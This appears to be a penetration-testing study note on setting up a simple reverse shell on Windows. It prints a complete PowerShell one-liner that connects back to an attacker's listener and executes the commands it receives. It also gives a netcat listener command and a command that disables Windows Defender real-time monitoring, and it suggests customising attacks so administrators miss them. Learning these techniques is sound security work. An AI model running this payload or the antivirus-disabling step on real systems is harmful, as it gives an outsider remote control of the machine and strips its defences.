- In a Reverse Shell, the attacker will have a listener running, and the target will need to initiate the connection.
- There are Helpful tools that infosec veterans have put together to assist.
	-  [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list off different commands, code, and even automated reverse shell generators to get a `reverse shell`.
	- Better to customize the attack a bit in order to carry a penetration test cause as many admins are aware of public repositories and open-source resources.

- ## Simple Reverse Shell in Windows:

	- Simple reverse Shell using some PowerShell code on Windows.
	
		- ### Server:
			- `nc -lvnp <port>`
			- `Listening on 0.0.0.0 <port>`
			
			- Ensure it does not get blocked going outbound through the OS firewall and at the network level.
			
				- A firewall is capable of deep packet inspection and `layer 7` visibility may be able to detect & stop a reverse shell going outbound on a common port because its examining the contents of the network packets, not just the IP address.

				- `Netcat` can be used to initiate the reverse shell on the `Windows Side`
		
		- ###### what applications and shell are hosted on the target ?
			- Initially use command prompt & PowerShell to establish the simple reverse shell.
			
			- ### Client(Target)
			
				- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
				
		- ###### Client(target)
			-  `Windows Defender antivirus` (`AV`) software stopped the execution of the code.
			-  Disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):
			
			- #### Disable AV:
				- `Set-MpPreference -DisableRealtimeMonitoring $true`
		
		- ### Server:
			- `nc -lvnp <port>`



[[Shells]]
